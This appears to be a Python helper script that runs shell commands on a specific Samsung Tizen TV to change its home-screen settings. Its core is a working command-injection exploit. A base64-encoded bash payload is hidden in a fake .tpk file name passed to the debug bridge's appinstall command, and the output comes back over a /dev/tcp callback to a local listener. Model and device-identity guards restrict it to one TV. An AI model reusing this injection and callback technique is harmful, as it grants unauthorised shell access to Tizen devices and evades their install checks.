"""Guarded one-shot Home helper for the owner's Samsung S90D. See README.md."""
from pathlib import Path
import base64
import hashlib
import ipaddress
import json
import socket
import sys
import threading
import time
import urllib.request
import uuid

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'scripts/lib'))
from sdb_transport import Sdb, push, shell

mode = sys.argv[1] if len(sys.argv) > 1 else 'query'
if mode not in ['query', 'inspect', 'apply', 'restore', 'debug', 'launch', 'stop-service','appstop','appstart']:
    raise SystemExit('Use inspect, query, apply, restore, debug, launch, or stop-service')
private = ROOT / '.local/native-home'
private.mkdir(parents=True, exist_ok=True)
private.chmod(0o700)
host = json.loads((ROOT / '.local/device.json').read_text())['host']
ipaddress.ip_address(host)
with urllib.request.urlopen('http://' + host + ':8001/api/v2/', timeout=5) as response:
    info = json.load(response)
if info.get('device', {}).get('modelName') != 'QE65S90DATXZT':
    raise SystemExit('Model guard failed before staging')
identity = info.get('device', {}).get('id')
if not identity: raise SystemExit('TV unique identity unavailable')
fingerprint = hashlib.sha256(identity.encode()).hexdigest()
identity_file = private / 'device-identity.sha256'
if identity_file.exists():
    if identity_file.read_text().strip() != fingerprint: raise SystemExit('Different TV; refusing device operation')
elif mode == 'inspect':
    with identity_file.open('x') as output: output.write(fingerprint + '\n')
else: raise SystemExit('Run inspect to record this TV before staging')
with Sdb(host, 'capability:') as channel:
    raw = channel.collect()
cap = raw[2:2 + int.from_bytes(raw[:2], 'little')].decode()
if not all(value in cap for value in ['platform_version:9.0', 'cpu_arch:armv7', 'architecture:32']):
    raise SystemExit('Tizen/architecture guard failed before staging')
remote_dir = '/home/owner/share/tmp/sdk_tools/'
if mode in ['query', 'apply', 'restore']:
    for suffix in ['dll', 'runtimeconfig.json', 'deps.json']:
        source = private / 'out' / ('CasaHomeControl.' + suffix)
        push(host, remote_dir + source.name, source.read_bytes())
if mode in ['apply', 'restore']:
    baseline = private / 'original.json'
    if not baseline.is_file():
        raise SystemExit('Original per-device baseline missing')
    push(host, remote_dir + 'CasaHomeOriginal.json', baseline.read_bytes())
token = uuid.uuid4().hex[:12]
remote = remote_dir + 'casa-' + token + '.sh'
cleanup = [remote] + [remote_dir + 'CasaHomeControl.' + suffix for suffix in ['dll', 'runtimeconfig.json', 'deps.json']] + [remote_dir + 'CasaHomeOriginal.json']
if mode in ['appstop','appstart']:
    import manage_app as managed
    target=sys.argv[2] if len(sys.argv)>2 else ''
    if not managed.consumer(target,stop_alias=mode=='appstop'):raise SystemExit('Consumer app guard failed')
    body=(ROOT/'scripts/tv/native-home'/(mode+'.sh')).read_text().replace('__ZENO_APPID__',target)
else:
    body = (ROOT / 'scripts/tv/native-home' / (mode + '.sh')).read_text()
push(host, remote, body.encode())
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
    route.connect((host, 9))
    local = route.getsockname()[0]
with socket.socket() as listener:
    listener.bind((local, 0))
    listener.listen(1)
    listener.settimeout(20)
    port = listener.getsockname()[1]
    command = 'cat ' + remote + '|bash >/dev/tcp/' + local + '/' + str(port) + ' 2>&1'
    script = '/bin/mkdir /tmp/s-' + token + ' 2>/dev/null&&{ ' + command + ';}'
    encoded = base64.b64encode(script.encode()).decode()
    name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    argument = '0 appinstall tpk ' + name
    if len(argument.encode()) > 400:
        raise SystemExit('Transport exceeds reviewed length')
    transport = {}
    def start():
        try:
            transport['output'] = shell(host, argument)
        except Exception as error:
            transport['error'] = str(error)
    worker = threading.Thread(target=start, daemon=True)
    worker.start()
    connection, peer = listener.accept()
    if peer[0] != host:
        connection.close()
        raise RuntimeError('Unexpected callback peer')
    output = bytearray()
    with connection:
        connection.settimeout(15)
        while True:
            chunk = connection.recv(65536)
            if not chunk:
                break
            output.extend(chunk)
            if len(output) > 100000:
                raise RuntimeError('Diagnostic output exceeded limit')
    text = output.decode(errors='replace')
    (private / (mode + '-output.txt')).write_text(text)
    worker.join(timeout=3)
    (private / (mode + '-transport.json')).write_text(json.dumps(transport, indent=2))
    if 'CASA_HOME_INSPECT_BEGIN' not in text or 'CASA_HOME_INSPECT_END' not in text:
        raise RuntimeError('Incomplete operation; query current values before any retry')
    cleanup_errors = []
    for path in cleanup:
        try: shell(host, '0 rmfile \"' + path + '\"')
        except Exception as error: cleanup_errors.append({'path': path, 'error': str(error)})
    (private / (mode + '-cleanup.json')).write_text(json.dumps(cleanup_errors, indent=2))
    print(text)
